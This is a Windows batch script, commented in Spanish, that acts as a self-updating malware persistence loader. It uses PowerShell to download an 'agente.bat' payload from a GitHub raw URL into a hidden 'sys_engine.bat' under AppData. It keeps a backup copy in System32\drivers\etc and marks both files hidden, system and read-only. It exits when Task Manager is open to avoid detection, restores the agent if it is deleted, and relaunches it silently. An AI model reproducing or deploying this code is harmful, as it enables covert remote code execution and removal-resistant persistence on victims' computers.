@echo off
setlocal enabledelayedexpansion

:: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
set "VERSION_LOCAL=%VERSION_DIR%\v.txt"
:: Corregido el doble Roaming para que coincida con el instalador
set "AGENTE_DIR=%AppData%\Microsoft\Vault"
set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data"

:: URLs de GitHub
set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets"
set "URL_VERSION=%URL_BASE%/version.txt"
set "URL_AGENTE=%URL_BASE%/agente.bat"

:: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
:: Intentamos bajar la versión de la nube a un temporal
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VERSION_DIR%\v.txt')" >nul 2>&1

if exist "%VERSION_DIR%\v.txt" (
    set /p VERSION_NUBE= < "%VERSION_DIR%\v.txt"
    del /f /q "%VERSION_DIR%\v.txt" >nul 2>&1
    
    :: LIMPIEZA DE FORMATO: Quitamos espacios vacíos que GitHub a veces añade
    set "VERSION_NUBE=!VERSION_NUBE: =!"
    
    :: Si la nube tiene una versión superior, descargamos el nuevo Agente
    if !VERSION_NUBE! GTR %VERSION_LOCAL% (
        
        :: 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR
        attrib -h -s -r "%AGENTE_FILE%" >nul 2>&1
        attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
        
        :: 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
        :: Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
        powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
        copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
        
        :: 2.3 RE-ACTIVACIÓN DE ESCUDOS
        attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
        attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
    )
)

:BUCLE_VIGILANCIA
:: --- 3. EVASIÓN (CENTINELA) ---
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>nul | find /I /N "taskmgr.exe" >nul
if "%errorlevel%"=="0" (
    exit
)

:: --- 4. RESTAURACIÓN Y EJECUCIÓN ---
:: Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
if not exist "%AGENTE_FILE%" (
    if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%" >nul 2>&1
    
    :: Restauramos y blindamos inmediatamente
    copy /y "%BACKUP_DIR%\sys_engine.bat" "%AGENTE_FILE%" >nul 2>&1
    attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
)

:: Si el Agente no está corriendo, lo lanzamos de forma silenciosa
tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
if %errorlevel% neq 0 (
    start /b "" cmd /c "%AGENTE_FILE%"
)
